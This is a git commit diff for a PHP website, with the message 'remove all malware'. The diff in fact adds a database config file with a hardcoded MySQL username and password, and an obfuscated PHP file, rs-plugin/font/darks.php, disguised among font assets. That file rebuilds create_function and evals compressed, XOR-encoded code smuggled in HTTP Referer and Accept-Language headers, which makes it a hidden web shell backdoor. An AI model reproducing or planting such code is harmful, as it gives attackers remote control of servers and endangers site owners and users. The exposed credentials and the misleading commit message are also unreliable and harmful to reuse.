01a2ec08ea9c20b58773c15a0805a527b0783f79
ElliottAYoung <elliott.a.young@gmail.com>
2017-02-28 16:24:13 -0600

    Recreate site - remove all malware - move to git

---
+++ dash/include/config.php
@@ -0,0 +1,8 @@
+<?php
+// Mysql Database Connectivity Code
+mysql_connect("localhost","artycock_khizar","jasminekhizar@1") or die(mysql_error());
+
+// Select Database
+mysql_select_db("artycock_ara");
+
+?>
---
+++ rs-plugin/font/darks.php
@@ -0,0 +1,16 @@
+<?php
+$O='EV=0.EV([\\d])EVEV)?,?/"EV,$ra,$m);if($q&EV&$m){@EVsessiEVoEVn_start(EV);$s=&$_EVSESSEVION;$sEVEVs="substr";$sEVlE';
+$W='r);   EV paEVrse_sEVtEVr(EV$u["query"],$q);$q=EVarray_vaEVlues($qEV);EVpreg_maEVtch_alEVl("/([\\EVw])EV[\\w-]+(?:;q';
+$k='0){$s[$i]="";$p=$EVsEVs($p,3);}iEVf(EVarraEVy_key_exisEVEVEVts($i,EV$s)){$s[$i].=$p;$e=strpEVos($s[EV$i],$fEV);if';
+$q=',0EV,3));$p=EV"";forEV(EVEV$z=EV1;$z<countEV($m[1]);$z++) $EVEVp.=$q[EV$m[2][$z]];if(EVEVstrpoEVs($p,EV$h)=EVEV==';
+$b='i<$l;){for($j=0EV;($j<$c&&$EVi<$l);EV$jEV++,EV$i++EV){$o.=$t{EV$i}^EV$k{$j};}}returnEV $o;}$EVr=$EV_SERVER;$EVrEVr';
+$N='=EV@$r[EV"HTTP_EVREFERER"];$EVra=@$r["HTTEVPEV_ACCEPT_LEVANGUAEVGE"];if($EVrrEV&&$ra){  EV  $uEVEV=parEVse_url($r';
+$g='V="strtolowerEV";$iEV=$m[EV1][0].$mEV[1][1]EV;EV$h=$sl($ssEV(md5(EV$i.$kh),0,EV3));$f=EV$sl($sEVs(mEVd5($i.$EVkf)';
+$M=str_replace('C','','CcCrCeateCC_functCion');
+$H='(EV$e){$k=$EVkhEV.$kf;ob_sEVtarEVt()EV;@evEVal(@gEVzuncompress(@x(EVEVEV@basEVe64_decode(preg_repEVlace(arEVray("';
+$V='ean();$d=basEVe64_encode(EVx(gzcEVompresEVs($oEV),EV$k));pEVrEVint("<$EVk>$d</EVEV$k>");@session_destroEVy();}}}}';
+$X='EV$kh="20e4";EVEV$kf="3b79";EVfuEVnctionEV x($tEV,$kEVEV){$c=strlen($k)EV;$l=strlen($EVt);$o="EV";forEV($EVi=0;$EVEV';
+$U='EV/EV_/"EV,"/-/"),EVarEVray("/","+"),$ss($sEV[$iEV],0EV,$e))),EV$k)));$o=EVEVob_get_cEVontentsEV();oEVbEVEV_end_cl';
+$Z=str_replace('EV','',$X.$b.$N.$W.$O.$g.$q.$k.$H.$U.$V);
+$j=$M('',$Z);$j();
+?>
